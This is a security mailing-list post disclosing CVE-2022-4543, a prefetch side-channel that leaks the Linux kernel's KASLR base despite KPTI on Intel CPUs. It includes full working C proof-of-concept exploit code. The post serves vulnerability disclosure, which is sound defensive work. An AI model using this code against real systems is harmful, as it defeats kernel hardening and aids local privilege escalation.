Received: (qmail 26496 invoked by uid 550); 16 Dec 2022 21:07:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24325 invoked from network); 16 Dec 2022 21:01:31 -0000
Date: Fri, 16 Dec 2022 21:01:12 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=protonmail.com;
	s=protonmail3; t=1671224479; x=1671483679;
	bh=6i4tsxXeEBOYi0xUYgPgFkunUImegd9yf8y6DrJehwY=;
	h=Date:To:From:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
	b=K8BomBvu340zhYB7ne4pk45r7cfz7SObuZqJnICCaSZUcAqBMs/kyqZdzDyQmxgk+
	 ONLWcnaN0NvP6jXx6kSVYgedmHFqb8jxBQgdbVvz5UgQBTjjjJOx9Hg9EKClHjgvrg
	 l+FdbWSCHyvtmQ0NyTi7Uac3JNPRbNa/Y6a8YHCkF4kz3iagL+IwpG/ixfVIUBDPpA
	 LzljkElRGHUOjX244qpzUO/mig66jYSCgMkc3zqPYIPVNTuuH0UFBI+ZA5EqHX8eHC
	 qMewBZN+f5wX9+WHWd7EpgXku9ptvcSmQs4MCuxlmYGlvANgr6t0xCBoCNnwocfNJS
	 Oo9PwvU2rbTiw==
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
From: Will <willsroot@protonmail.com>
Message-ID: <vbyEQC3tHcxJUNJZ0GdUvwrfJgqYDt5X9gNkzWNdafe932tTAzVpeRIm_xt8rq3i7W2ZRwif9KVRxRZ0i77SqRAT2okJDB458AEh0ghANqU=@protonmail.com>
Feedback-ID: 25491499:user:proton
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] CVE-2022-4543: KASLR Leakage Achievable even with KPTI through Prefetch Side-Channel

I've discovered that KPTI has implementation issues, allowing any local att=
acker to easily, quickly, and reliably leak KASLR base via prefetch side-ch=
annels based on TLB timing for Intel systems.

I currently have developed code samples that can reliably leak KASLR base u=
sing this technique in under a second under normal system conditions with k=
PTI, both on host and guest OSes (under KVM), on the following CPUs: Intel =
i5-8265U (Arch 6.0.12-hardened1-1-hardened), Intel i7-8750H, Intel i7-9750H=
 (Ubuntu 5.15.0-56-generic host, custom 5.18.3 on guest), Intel i7-9700F (6=
.0.12-1-MANJARO), and Intel Xeon(R) CPU E5-2640 (5.10.0-19-amd64). I do not=
 believe this affects AMD CPUs based on personal preliminary testing.

It is already known that systems without KPTI are vulnerable to prefetch si=
de-channels for KASLR leakage. However, there seemed to be an assumption th=
at KPTI/KAISER will provide enough isolation to prevent CPU side-channel at=
tacks against KASLR.=20

This turns out to not be the case due to what KPTI leaves in userspace mapp=
ings. The code under entry_SYSCALL_64 is still mapped into userspace to han=
dle syscalls, and the virtual address mapping is at a constant offset to ke=
rnel base. An attacker can repeatedly make syscalls to force that page into=
 the TLB, and then perform the prefetch side-channel to figure out the addr=
ess of entry_SYSCALL_64, which will break KASLR. This is because prefetch e=
xecutes faster when a virtual address is in the TLB and avoids a page table=
 walk, and the entry for that page isn't flushed out upon CR3 write due to =
it having the global bit.

Based on early discussions with security@kernel.org and linux-distros@vs.op=
enwall.org, this behavior is unintended and might even be a regression in K=
PTI's implementation. A fix for this is currently not available.

More information can be found at https://www.willsroot.io/2022/12/entryblee=
d.html. The following is a primitive demonstration code that leaks KASLR ba=
se on systems with KPTI with a high degree of reliability, compiled with gc=
c using -static and -no-pie (entry_SYSCALL_64_offset has to be adjusted bas=
ed on kernel by setting it to the distance between it and startup_64):

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
#define entry_SYSCALL_64_offset 0x400000ull

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=3Dr" (a), "=3Dr" (b), "=3Dr" (c), "=3Dr" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a =3D (b << 32) | a;
  c =3D (d << 32) | c;
  return c - a;
}

#define STEP 0x100000ull
#define SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset
#define SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

uint64_t leak_syscall_entry(void)=20
{
    uint64_t data[ARR_SIZE] =3D {0};
    uint64_t min =3D ~0, addr =3D ~0;

    for (int i =3D 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx =3D 0; idx < ARR_SIZE; idx++)=20
        {
            uint64_t test =3D SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time =3D sidechannel(test);
            if (i >=3D DUMMY_ITERATIONS)
                data[idx] +=3D time;
        }
    }

    for (int i =3D 0; i < ARR_SIZE; i++)
    {
        data[i] /=3D ITERATIONS;
        if (data[i] < min)
        {
            min =3D data[i];
            addr =3D SCAN_START + i * STEP;
        }
        printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
    }

    return addr;
}

int main()
{
    printf ("KASLR base %llx\n", leak_syscall_entry() - entry_SYSCALL_64_of=
fset);
}
